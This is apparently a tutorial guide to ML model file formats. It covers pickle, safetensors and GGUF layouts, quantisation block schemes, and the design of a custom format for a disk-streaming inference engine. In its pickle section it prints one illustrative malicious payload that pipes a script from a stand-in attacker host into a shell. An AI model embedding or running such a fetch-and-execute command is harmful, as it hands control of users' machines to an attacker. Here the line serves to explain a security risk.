# 02 — Model File Formats

**What's actually inside a model file, and why there are a dozen incompatible kinds.**

Guide 01 covered what the numbers *mean*. This one covers how they're stored on disk —
which, for a project whose entire thesis is "read weights from disk efficiently", is not a
side topic. It's the substrate.

Everything in this guide was verified against two real files on this machine:

```
models/qwen3-0.6b/model.safetensors                    1,503,300,328 B   bf16
~/.ollama/models/blobs/sha256-7f403014...              522,640,096 B     GGUF Q4_K_M
```

Same model. Same 596 million parameters. **2.88× difference in size.** By the end you'll
know exactly where that factor went.

---

# Part 1 — The Concept

## What a model file has to contain

Strip away the branding and every format is solving the same three problems:

**① The numbers.** 596 million of them. This is 99%+ of the bytes. Non-negotiable.

**② The shapes.** A flat run of 4,194,304 bytes is meaningless until you know it's a
`[2048, 1024]` matrix of bf16 called `q_proj` belonging to layer 0. This is *metadata*, and
it's what turns a blob into a model.

**③ Everything else you need to actually run it.** The architecture and hyperparameters
(guide 01's config), the tokenizer's vocabulary and merge rules, the chat template, the
special token IDs.

**The formats differ mainly on whether ③ lives inside the file or beside it.** That single
decision explains most of the design differences you'll see.

## The five axes

When you meet a new format, ask these five questions and you'll understand it immediately:

| axis | the two poles |
|---|---|
| **Self-contained?** | everything in one file — vs — weights only, config alongside |
| **Zero-copy?** | can you `mmap` and use bytes in place — vs — must parse/decompress first |
| **Safe?** | pure data — vs — executes code when you load it |
| **Weights or graph?** | just the numbers — vs — the numbers *and* the computation graph |
| **Portable?** | runs anywhere — vs — compiled for one specific chip |

## The family tree

```
        research / training                inference / deployment
       ─────────────────────              ────────────────────────

   PyTorch pickle (.bin/.pth)  ──┐
   "just pickle the tensors"     │
            │ unsafe             ├──►  GGUF          (llama.cpp, Ollama — CPU-first)
            ▼                    │      self-contained, quantised, single file
      safetensors  ──────────────┤
      "same data, no code"       ├──►  GPTQ/AWQ/EXL2 (GPU, quantised safetensors)
            │                    │
            │                    ├──►  ONNX          (cross-framework graph)
            │                    │       └──► TensorRT / OpenVINO / CoreML
            │                    │             (compiled, hardware-locked)
            └────────────────────┴──►  MLX           (Apple Silicon)
```

Read it left to right as a pipeline: models are *trained* into pickle or safetensors, then
*converted* into whatever the target runtime wants.

---

# Part 2 — The Container Formats

## 2.1 PyTorch pickle — `.bin`, `.pt`, `.pth`

**The ancestor. Avoid it, but you must recognise it.**

`torch.save(model.state_dict(), "model.bin")` produces a ZIP archive containing Python
**pickle** bytecode plus raw tensor storage:

```
model.bin  (a ZIP)
├── archive/data.pkl        ← pickled Python objects describing the tensors
├── archive/data/0          ← raw bytes of tensor 0
├── archive/data/1          ← raw bytes of tensor 1
└── archive/version
```

### The problem

Pickle is not a data format. **It is a stack-based virtual machine that executes
instructions**, including `GLOBAL` and `REDUCE`, which can import and call arbitrary Python:

```python
# a malicious pickle payload, conceptually:
os.system("curl evil.com/x.sh | sh")
```

Loading an untrusted `.bin` file **runs whatever the author wanted to run**, with your
privileges, before you see a single tensor. There is no sandbox. `torch.load(weights_only=True)`
mitigates this in modern PyTorch, but the format's default posture was dangerous for years.

This is the entire reason safetensors exists.

### Other problems

- **No zero-copy.** You must decompress and unpickle to get tensors; peak memory is roughly
  2× the model size during load.
- **No partial reads.** You can't cheaply grab layer 17 without walking the archive.
- **Python-coupled.** Reading it from Rust means reimplementing pickle. People do. It's grim.

| axis | verdict |
|---|---|
| self-contained | ✗ needs `config.json`, tokenizer files |
| zero-copy | ✗ |
| safe | ✗ **executes arbitrary code** |
| graph | ✗ weights only |
| portable | ✓ (if you have Python) |

> **You will still encounter this.** Older checkpoints, `pytorch_model.bin`, many research
> releases. Prefer the safetensors version if one exists — it almost always does.

---

## 2.2 safetensors — what we're using

**The fix: identical data, zero executable content, mmap-friendly.**

Designed by Hugging Face specifically to kill the pickle problem. The whole spec fits on
one page, which is its greatest virtue.

### Exact byte layout

```
offset 0        ┌─────────────────────────────┐
                │  u64, little-endian:  N     │  8 bytes — length of the header
offset 8        ├─────────────────────────────┤
                │  N bytes of UTF-8 JSON      │  the header
offset 8+N      ├─────────────────────────────┤
                │  raw tensor bytes,          │  everything else
                │  back to back, no padding   │
                └─────────────────────────────┘
```

That's the whole format. Three regions.

### The header

A single JSON object mapping tensor name → descriptor:

```json
{
  "__metadata__": { "format": "pt" },

  "lm_head.weight": {
    "dtype": "BF16",
    "shape": [151936, 1024],
    "data_offsets": [0, 311164928]
  },
  "model.layers.0.self_attn.q_proj.weight": {
    "dtype": "BF16",
    "shape": [2048, 1024],
    "data_offsets": [647500288, 651694592]
  }
}
```

Rules that matter when you implement the reader:

- **`data_offsets` are relative to the start of the data region**, i.e. relative to `8 + N`,
  *not* to the start of the file. Getting this wrong is the classic first bug.
- Offsets are `[begin, end)` — half-open, like Rust ranges. Length is `end - begin`.
- Tensor data is **C-order (row-major)** and **contiguous**. No strides, no padding.
- `__metadata__` is the one reserved key; its values must be strings.
- The header is space-padded so the data region starts 8-byte aligned. **In our file:
  `N = 35,552`, so data starts at `35,560`, which is `8 × 4,445`.** Verified.

### Supported dtypes

```
BOOL  U8  I8  F8_E5M2  F8_E4M3  I16  U16  F16  BF16  I32  U32  F32  F64  I64  U64
```

Note what's **absent**: there is no 4-bit type, no block quantisation, no scales-and-zeros
scheme. safetensors stores plain arrays only. Quantised models in this format (GPTQ, AWQ)
smuggle their quantisation in by storing *extra tensors* — packed `int32` weights plus
separate scale and zero-point tensors — and describing the scheme in `config.json`.

### Sharding

Files over ~5 GB get split, with an index:

```
model-00001-of-00004.safetensors
model-00002-of-00004.safetensors
...
model.safetensors.index.json      ← { "weight_map": { "tensor.name": "model-00002-of-00004.safetensors" } }
```

Our 0.6B model is a single file. The kimi-k3 reference deals with **96 shards**.

### Why it's ideal for this project

You `mmap` the file, parse a 35 KB header, and then **every tensor is a slice of the mapped
region at a known offset**. No copy, no parse, no allocation. The OS pages in exactly the
bytes you touch and evicts them under pressure. That is precisely the primitive a
disk-streaming engine needs.

| axis | verdict |
|---|---|
| self-contained | ✗ needs `config.json`, `tokenizer.json` alongside |
| zero-copy | ✓ **mmap directly** |
| safe | ✓ pure data, no code |
| graph | ✗ weights only |
| portable | ✓ trivially |

---

## 2.3 GGUF — the llama.cpp / Ollama format

**The opposite philosophy: put absolutely everything in one file.**

GGUF (GGML Universal File) is what `llama.cpp` and Ollama use. Where safetensors says
"weights only, keep it simple", GGUF says "one file you can hand to someone and it just
runs" — weights, config, tokenizer, chat template, all of it.

### Exact byte layout

```
┌──────────────────────────────────────────┐
│ magic  "GGUF"                    4 bytes │
│ version  u32                     4 bytes │   = 3
│ tensor_count  u64                8 bytes │   = 311
│ metadata_kv_count  u64           8 bytes │   = 28
├──────────────────────────────────────────┤
│ metadata key-value pairs                 │   ← config AND tokenizer live here
│   key:   u64 len + UTF-8 bytes           │
│   type:  u32 enum                        │
│   value: depends on type                 │
├──────────────────────────────────────────┤
│ tensor infos × tensor_count              │
│   name:    u64 len + UTF-8 bytes         │
│   n_dims:  u32                           │
│   dims:    u64 × n_dims                  │
│   type:    u32   (ggml quant type)       │
│   offset:  u64   (relative to data start)│
├──────────────────────────────────────────┤
│ padding to general.alignment (default 32)│
├──────────────────────────────────────────┤
│ tensor data                              │
└──────────────────────────────────────────┘
```

Value types are a small typed enum: `UINT8=0, INT8=1, UINT16=2, INT16=3, UINT32=4, INT32=5,
FLOAT32=6, BOOL=7, STRING=8, ARRAY=9, UINT64=10, INT64=11, FLOAT64=12`. Arrays carry an
element type and a count.

### What's actually in ours

Parsed directly from your Ollama blob:

```
magic=b'GGUF'  version=3  tensors=311  metadata_kv=28

general.architecture                    STRING   qwen3
qwen3.block_count                       UINT32   28
qwen3.embedding_length                  UINT32   1024
qwen3.feed_forward_length               UINT32   3072
qwen3.attention.head_count              UINT32   16
qwen3.attention.head_count_kv           UINT32   8
qwen3.attention.key_length              UINT32   128
qwen3.rope.freq_base                    FLOAT32  1000000.0
qwen3.attention.layer_norm_rms_epsilon  FLOAT32  9.999999974752427e-07
tokenizer.ggml.model                    STRING   gpt2
tokenizer.ggml.tokens                   ARRAY    <151,936 × STRING>
tokenizer.ggml.merges                   ARRAY    <151,387 × STRING>
tokenizer.chat_template                 STRING   {%- if tools %}...
general.file_type                       UINT32   15
```

**Every field from guide 01 is here**, just renamed: `hidden_size` → `qwen3.embedding_length`,
`num_hidden_layers` → `qwen3.block_count`, `rope_theta` → `qwen3.rope.freq_base`. Plus the
entire tokenizer and the Jinja chat template.

### The cost of self-containment

That metadata block is **5,932,863 bytes**. The full header — metadata plus 311 tensor
infos — ends at byte **5,951,169**, padded up to **5,951,200** where tensor data begins.

```
safetensors header:      35,560 bytes      (0.002% of file)
GGUF header:          5,951,200 bytes      (1.14%  of file)
```

**You must read ~6 MB before you can locate a single tensor.** On your HDD that's 40 ms of
startup you can't avoid. In exchange, you never need a second file.

### The dimension-order trap

This will bite you:

```
safetensors:   q_proj      shape [2048, 1024]
GGUF:          blk.0.attn_q  dims [1024, 2048]
```

**Same tensor, same bytes, reversed dimension list.** safetensors lists dimensions in C
order (slowest-varying first, like numpy). GGUF inherits ggml's `ne[]` convention, which
lists fastest-varying first. Neither is wrong; they're opposite conventions. If you ever
write a converter, this is where you'll lose an afternoon.

Naming differs too: `model.layers.0.self_attn.q_proj.weight` → `blk.0.attn_q.weight`.

| axis | verdict |
|---|---|
| self-contained | ✓ **everything in one file** |
| zero-copy | ✓ mmap-able (but dequantisation still costs CPU) |
| safe | ✓ pure data |
| graph | ✗ weights + hyperparams, architecture is hardcoded in the runtime |
| portable | ✓ |

---

## 2.4 ONNX — the graph format

**Stores the computation, not just the numbers.**

Every format above stores *weights* and assumes the runtime already knows what a Qwen3
layer looks like. ONNX (Open Neural Network Exchange) stores the **computation graph** too —
a protobuf describing nodes (`MatMul`, `Softmax`, `Add`), their connections, and the
initialiser tensors.

```
model.onnx  (protobuf)
├── graph
│   ├── node[]         MatMul → Add → Softmax → ...
│   ├── initializer[]  the weight tensors
│   ├── input[] / output[]
└── opset_import       which operator version
```

**Why that matters:** a runtime that has never heard of Qwen3 can still execute it, because
the file spells out every operation. That's genuine framework independence.

**Why it's awkward for LLMs:** protobuf has a 2 GB message limit, so large models must
externalise weights to sidecar files anyway. Dynamic shapes and KV caches are painful to
express. And graph-level generality costs you the hand-tuned kernels that make LLM inference
fast. It's excellent for vision models and traditional ML, marginal for large language models.

---

## 2.5 Compiled runtime formats

These are not portable files; they're **build artefacts for one specific chip**.

| format | vendor | notes |
|---|---|---|
| **TensorRT** `.plan`/`.engine` | NVIDIA | Fused, kernel-tuned, autotuned for one GPU model. Fastest option on NVIDIA. Not portable *at all* — often invalid across driver versions. |
| **OpenVINO IR** `.xml` + `.bin` | Intel | Graph in XML, weights in binary. Intel CPU/iGPU/NPU. |
| **Core ML** `.mlpackage` | Apple | Apple Neural Engine. Converted from ONNX or PyTorch. |
| **ExecuTorch** `.pte` | Meta | PyTorch's on-device runtime, mobile/embedded. |
| **TFLite** `.tflite` | Google | FlatBuffers. Mobile, embedded, microcontrollers. |

The pattern: you *compile* to these from ONNX or PyTorch, gaining speed and losing
portability. Irrelevant to Morphogenesis — we're deliberately CPU-and-disk bound.

---

## 2.6 Quantised-checkpoint conventions

These aren't new container formats — they're **safetensors files with extra tensors** plus
a `quantization_config` block in `config.json`.

| scheme | idea | typical use |
|---|---|---|
| **GPTQ** | Post-training quantisation using second-order (Hessian) error compensation, layer by layer | GPU, 4-bit |
| **AWQ** | Activation-aware — protects the ~1% of weight channels that matter most, based on activation magnitude | GPU, 4-bit, often better than GPTQ |
| **EXL2 / EXL3** | ExLlama's variable-bitrate format; different layers get different precision to hit a target average bpw | GPU, fractional bits (e.g. 4.65 bpw) |
| **bitsandbytes** | On-the-fly quantisation at load time, `NF4`/`INT8` | training and QLoRA |
| **FP8** | Native 8-bit float, hardware-accelerated | H100/Blackwell |

A GPTQ checkpoint looks like this inside:

```
model.layers.0.self_attn.q_proj.qweight   int32   packed 4-bit values
model.layers.0.self_attn.q_proj.qzeros    int32   packed zero-points
model.layers.0.self_attn.q_proj.scales    fp16    one scale per group
model.layers.0.self_attn.q_proj.g_idx     int32   group index per column
```

Same container, extra tensors, scheme described in config. That's the pattern for every
"quantised safetensors" variant.

---

## 2.7 Framework-native odds and ends

| format | notes |
|---|---|
| **MLX** `.safetensors`/`.npz` | Apple's array framework. Reuses safetensors; unified-memory oriented. |
| **NumPy** `.npy` / `.npz` | `.npy` is one array with a tiny ASCII header; `.npz` is a ZIP of them. Great for **dumping test fixtures**, which is exactly what we'll use it for in Phase 0. |
| **TF SavedModel** / **Keras** `.h5`, `.keras` | TensorFlow's directory-with-protobuf and HDF5 formats. Rare for modern LLMs. |
| **JAX / Orbax** | Checkpoint directories, sharded for TPU pods. |
| **PaddlePaddle** `.pdparams` | Baidu's ecosystem, ERNIE models. |

---

## 2.8 "HuggingFace format" — a convention, not a format

People say "HF format" constantly. It isn't a file format; it's a **directory layout**:

```
models/qwen3-0.6b/
├── config.json               architecture + hyperparameters  (guide 01)
├── model.safetensors         the weights
├── generation_config.json    default sampling settings
├── tokenizer.json            the full fast-tokenizer (vocab + merges + rules)
├── tokenizer_config.json     chat template, special tokens
├── vocab.json                legacy: token → id
└── merges.txt                legacy: BPE merge rules
```

This is what you downloaded. `config.json` + `model.safetensors` is the pairing that makes
safetensors' "weights only" stance workable — the missing information lives next door.

---

## 2.9 The distribution layer

Worth knowing because you saw it in the download headers.

**Git LFS** was the old way: the git repo stores a text pointer, the real bytes live on a
separate server. **Xet** is HuggingFace's replacement — content-defined chunking that splits
files into ~64 KB variable-size chunks and deduplicates them globally. Change one tensor in
a 100 GB model and only the affected chunks re-upload.

You saw its fingerprints in the HTTP response:

```
x-linked-size: 1503300328
x-xet-hash: ...
```

This is a *transport* concern, not a file format — what lands on your disk is a plain
safetensors file either way.

---

# Part 3 — How the Numbers Are Stored

The container tells you *where* a tensor is. This tells you what its bytes *mean*.

## 3.1 Plain dtypes

| dtype | bytes | layout | notes |
|---|---:|---|---|
| **F32** | 4 | 1 sign, 8 exponent, 23 mantissa | the reference. Training used to happen here. |
| **F16** | 2 | 1, 5, 10 | more precision, **much smaller range**. Overflows easily. |
| **BF16** | 2 | 1, **8**, 7 | **same range as F32**, less precision. What our model uses. |
| **F8_E4M3** | 1 | 1, 4, 3 | H100-class hardware |
| **F8_E5M2** | 1 | 1, 5, 2 | more range, less precision |
| **I8** | 1 | integer | needs an external scale to mean anything |

The key insight, and the reason **bf16** won for ML: it has the *same 8 exponent bits as
f32*, so it covers the same enormous dynamic range and simply never overflows where f32
wouldn't. It just carries fewer significant digits — and neural networks turn out to care
far more about range than precision.

The lovely consequence: **bf16 is literally the top 16 bits of an f32.** Converting is a
bit-shift, not arithmetic. Guide 03 covers this properly.

## 3.2 Block quantisation — the concept

You can't just round every weight to 4 bits. Weights span wildly different magnitudes, and
one global scale would crush the small ones to zero.

So: **chop the tensor into small blocks, and give each block its own scale.**

```
32 weights:  [0.021, -0.014, 0.008, ..., 0.019]
                        │
                        ▼  find max |w| in this block  → 0.021
                        ▼  scale d = 0.021 / 7
                        ▼  q_i = round(w_i / d)   →  4-bit ints
                        │
stored:      [ d (2 bytes) ][ 32 × 4-bit = 16 bytes ]  = 18 bytes
```

Each block adapts to its own local magnitude. **Overhead per block is the scale**, so
smaller blocks mean better accuracy and worse compression. That trade-off is the entire
design space of every quant format below.

## 3.3 Legacy block quants (blocks of 32)

| type | block layout | bytes/32 | bpw | dequant |
|---|---|---:|---:|---|
| **Q8_0** | `f16 d` + 32×`i8` | 34 | 8.50 | `w = d · q` |
| **Q4_0** | `f16 d` + 16 B nibbles | 18 | 4.50 | `w = d · (q − 8)` |
| **Q4_1** | `f16 d` + `f16 m` + 16 B | 20 | 5.00 | `w = d · q + m` |
| **Q5_0** | `f16 d` + `u32` high bits + 16 B | 22 | 5.50 | `w = d · (q − 16)` |
| **Q5_1** | `f16 d` + `f16 m` + `u32` + 16 B | 24 | 6.00 | `w = d · q + m` |

`Q4_0` is *symmetric* — one scale, values centred by subtracting 8. `Q4_1` is *asymmetric* —
it also stores a minimum, so it can represent lopsided distributions, at the cost of an
extra 2 bytes per block.

**`Q8_0` is the sweet spot for a first implementation.** Dead simple, essentially lossless,
and it halves your bytes — which on a bandwidth-bound engine means it nearly doubles your
speed.

## 3.4 K-quants — superblocks of 256

The insight: the per-block scales are themselves overhead, and they're *also* compressible.

K-quants use a **superblock of 256 weights** split into sub-blocks. The sub-block scales are
quantised to 6 bits and share a single f16 super-scale.

```
Q4_K superblock — 144 bytes for 256 weights  (VERIFIED against your GGUF)
┌────────┬────────┬──────────────────┬──────────────────────────────┐
│ d  f16 │dmin f16│ 12 B: 8 sub-block│  128 B: 256 × 4-bit values   │
│  2 B   │  2 B   │ scales+mins, 6-bit│                              │
└────────┴────────┴──────────────────┴──────────────────────────────┘

Q6_K superblock — 210 bytes for 256 weights  (VERIFIED)
┌──────────────┬─────────────┬──────────────┬────────┐
│ ql   128 B   │ qh   64 B   │ scales 16 B  │ d  f16 │
│ low 4 bits   │ high 2 bits │ int8 × 16    │  2 B   │
└──────────────┴─────────────┴──────────────┴────────┘
```

| type | bytes/256 | bpw | typical use |
|---|---:|---:|---|
| **Q2_K** | 84 | 2.63 | extreme compression, real quality loss |
| **Q3_K** | 110 | 3.44 | |
| **Q4_K** | **144** | **4.50** | the workhorse |
| **Q5_K** | 176 | 5.50 | |
| **Q6_K** | **210** | **6.56** | near-lossless |
| **Q8_0** | 272 | 8.50 | effectively lossless |

I verified `Q4_K` and `Q6_K` arithmetically against every tensor in your Ollama file — for
example `token_embd.weight` holds 155,582,464 weights and occupies exactly
`155,582,464 × 144/256 = 87,515,136` bytes. Every tensor matched to the byte.

> **⚠ The 256 divisibility constraint.** K-quants need dimensions divisible by 256. Tensors
> that don't divide fall back to a legacy quant or stay in f16. This is why quantised models
> have odd mixed-precision layouts.

**I-quants** (`IQ1_S`, `IQ2_XXS`, `IQ4_XS`…) go further using learned codebooks and lattice
quantisation, reaching under 2 bpw. Much slower to dequantise. Skip them for now.

## 3.5 The `_S` / `_M` / `_L` suffix — mixtures, not types

Here's a thing that confuses everyone: **`Q4_K_M` is not a quantisation type.** It's a
*recipe* that assigns different types to different tensors. Sensitive tensors get more bits.

Your Ollama file is `Q4_K_M`, and here is what it actually contains:

```
quant histogram:  {'Q4_K': 155, 'F32': 113, 'F16': 28, 'Q6_K': 15}
```

Decoded:

| tensors | type | why |
|---|---|---|
| 113 norm weights (4/layer + final) | **F32** | tiny (4 KB each), and normalisation is precision-critical |
| 28 × `attn_v` | **F16** | Value vectors feed straight into the output; kept at full precision |
| 14 × `ffn_down` + `output.weight` | **Q6_K** | the most sensitive matrices get extra bits |
| everything else (141) + `token_embd` | **Q4_K** | the bulk |

Note the deliberate asymmetry: **half** the `ffn_down` tensors are `Q6_K` and half are
`Q4_K`. And `output.weight` (the lm_head) is `Q6_K` while `token_embd` is `Q4_K` — even
though guide 01 told us these are *tied*. The converter **untied them** specifically so the
output head could keep more precision. A quantiser making a quality judgement the original
model never expressed.

Rough guide to the suffixes:

| suffix | meaning |
|---|---|
| `_S` | small — nearly everything at the base type |
| `_M` | medium — key tensors bumped up. **The usual recommendation.** |
| `_L` | large — more tensors bumped up |

---

# Part 4 — Side by Side, Same Model

Everything below is measured from the two files on your disk.

| | **safetensors bf16** | **GGUF Q4_K_M** |
|---|---:|---:|
| file size | 1,503,300,328 | 522,640,096 |
| header size | 35,560 | 5,951,200 |
| tensors | 311 | 311 |
| includes tokenizer | ✗ (separate 11 MB) | ✓ |
| includes config | ✗ (separate) | ✓ |
| includes chat template | ✗ (in tokenizer_config) | ✓ |
| weight precision | uniform bf16 | mixed Q4_K/Q6_K/F16/F32 |
| dequant cost | shift only | real CPU work |
| embeddings | duplicated (311 MB wasted) | untied on purpose |
| **bytes read per token** | **~1.19 GB** | **~0.41 GB** |
| **predicted s/token on your HDD** | **~8.0** | **~2.8** |

That last row is the punchline of this entire project. Quantisation is not primarily about
fitting in RAM. **On a bandwidth-bound engine it is a direct, nearly linear speedup**, because
`time ≈ bytes / bandwidth` and you just cut the bytes by 2.9×.

## Where the 2.88× went

```
1,503,300,328  safetensors bf16
   −311,164,928  drop the duplicated embedding table (tie them)
─────────────
1,192,135,400  actual model at bf16
        ÷ ~2.9  bf16 (16 bpw) → mixed K-quant (~5.5 bpw average)
─────────────
  522,640,096  GGUF Q4_K_M   ✓
```

---

# Part 5 — Choosing for Morphogenesis

## Why safetensors is the right call here

**1. The format disappears.** 40 lines of Rust and you're done. Every hour you'd have spent
debugging 6-bit packed sub-scales is an hour not spent learning transformers. K-quant
dequantisation is genuinely fiddly and it is the *worst* possible thing to debug first,
because a subtle unpacking bug and a subtle attention bug produce identical symptoms:
fluent nonsense.

**2. bf16 gives us ground truth.** Full precision means when our Rust logits disagree with
the numpy reference, the model is not the suspect — our code is. With a quantised model you
never know whether a 2% deviation is your bug or the quantiser's rounding.

**3. Quantisation becomes ours to build.** Phase 7 has us implement `Q8_0` and `Q4_0`
ourselves. Starting from bf16 means we can measure the *exact* quality and speed delta,
because we hold both ends. Starting from GGUF, someone already made those choices and we'd
just be inheriting them.

**4. mmap is the right primitive.** A disk-streaming engine wants "here is a file, here are
byte offsets, page in what you touch." safetensors is barely more than that.

## Designing `.morph` — our own format (Phase 6)

Guide 01's byte accounting plus this guide's layout facts point at a real problem. In our
safetensors file, tensors are ordered **lexicographically**:

```
layers appear as:   0, 1, 10, 11, ..., 19, 2, 20, ..., 27, 3, 4, ...
within a layer:     down_proj, gate_proj, up_proj, k_norm, k_proj, o_proj, q_norm, q_proj, v_proj
execution order:    q_proj, k_proj, v_proj, o_proj, gate_proj, up_proj, down_proj
```

Executing 0→27 against that layout means ~11 seeks per layer, ~300 per token. At ~10 ms per
seek on your HDD that's roughly **3 seconds of pure head movement per token**, on top of the
~8 seconds of transfer.

So Phase 6 builds a repacking tool. The design targets:

```
┌────────────────────────────────────────────────────────────┐
│ magic "MORPH" + version                                     │
│ small fixed header: config, layer count, layer stride       │
│ tensor directory (offsets, in execution order)              │
├────────────────────────────────────────────────────────────┤
│ layer 0   ── q, k, v, o, gate, up, down ── contiguous       │  one seek
│ layer 1   ── q, k, v, o, gate, up, down ── contiguous       │  → sequential
│ ...                                                         │
│ layer 27                                                    │
├────────────────────────────────────────────────────────────┤
│ embedding table (random-access region, page-aligned)        │
│ lm_head (aliased to embeddings if tied)                     │
└────────────────────────────────────────────────────────────┘
```

Design decisions, each traceable to something measured in these two guides:

- **Execution order, not alphabetical** — turns ~300 seeks/token into ~28 sequential reads
- **Fixed layer stride** — layer *n* lives at `base + n × 31,461,888`; no directory lookup
  in the hot loop, and prefetching layer *n+1* is trivial
- **Page-aligned layer boundaries** (4 KB) — required if we want `O_DIRECT`
- **Tied embeddings stored once** — reclaims the 311 MB safetensors wastes
- **Small header** — GGUF's 6 MB preamble costs 40 ms of HDD startup; ours should be a few KB
- **Quantisation-agnostic** — a per-tensor dtype field so Phase 7 can drop in `Q8_0`
  without a format change

This is where the project stops reproducing `kimi-k3-in-c` and starts being its own thing:
the reference repacks its trunk because it *has to* at 1.56 TB. We'll repack because we can
**measure** what it buys us, on two storage tiers three orders of magnitude apart.

---

# Decision Table

| you want to… | use |
|---|---|
| train / fine-tune | safetensors (or pickle if forced) |
| distribute to researchers | safetensors + HF directory layout |
| run on CPU, single file | GGUF |
| run on NVIDIA GPU, quantised | GPTQ / AWQ / EXL2 |
| squeeze maximum GPU speed | TensorRT |
| cross-framework portability | ONNX |
| ship to phone / embedded | TFLite, ExecuTorch, Core ML |
| **learn how inference works** | **safetensors** ← we are here |

---

# Glossary

| term | meaning |
|---|---|
| **bpw** | bits per weight, including quantisation overhead |
| **block / superblock** | group of weights (32 or 256) sharing one scale |
| **dequantisation** | reconstructing float values from quantised ints + scales |
| **initialiser** | ONNX's word for a stored weight tensor |
| **mmap** | map a file into the address space so reads become memory accesses |
| **pickle** | Python's serialisation format; executes code on load |
| **quantisation** | storing weights with fewer bits than the original float |
| **scale / zero-point** | the multiplier and offset that turn an int back into a float |
| **shard** | one file of a multi-file checkpoint |
| **zero-copy** | usable directly from mapped bytes, without parsing or copying |

---

**Next:** `03-bf16-and-numbers.md` — the bit layout of floats, why bf16→f32 is a shift
rather than arithmetic, and how to write the conversion without a lookup table.
